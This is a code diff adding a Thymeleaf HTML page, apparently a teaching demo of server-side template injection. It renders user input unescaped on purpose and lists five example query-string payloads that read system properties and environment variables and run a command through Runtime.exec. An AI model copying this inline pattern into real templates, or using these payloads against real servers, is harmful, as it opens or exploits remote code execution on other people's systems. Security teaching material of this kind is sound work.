@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>Vulnerable Template</title>
+</head>
+<body>
+    <h1>VULNERABLE: Template Injection Demo</h1>
+
+    <!-- VULNERABLE: Using inline preprocessing with user input -->
+    <!-- The double underscore __ enables preprocessing -->
+    <div th:inline="text">
+        Hello [(${name})]!
+    </div>
+
+    <hr>
+    <h2>Attack Examples:</h2>
+    <pre>
+1. Get system property:
+   ?name=__${T(java.lang.System).getProperty('user.name')}__
+
+2. Get Java version:
+   ?name=__${T(java.lang.System).getProperty('java.version')}__
+
+3. Execute command (may be blocked by security manager):
+   ?name=__${T(java.lang.Runtime).getRuntime().exec('calc')}__
+
+4. Read environment variable:
+   ?name=__${T(java.lang.System).getenv('PATH')}__
+
+5. Access application context:
+   ?name=__${#ctx.getVariable('T(java.lang.System).getProperty("os.name")')}__
+    </pre>
+
+    <p><strong>Why this is dangerous:</strong> The preprocessor evaluates expressions before template processing,
+    allowing attackers to execute arbitrary Java code on the server!</p>
+</body>
+</html>
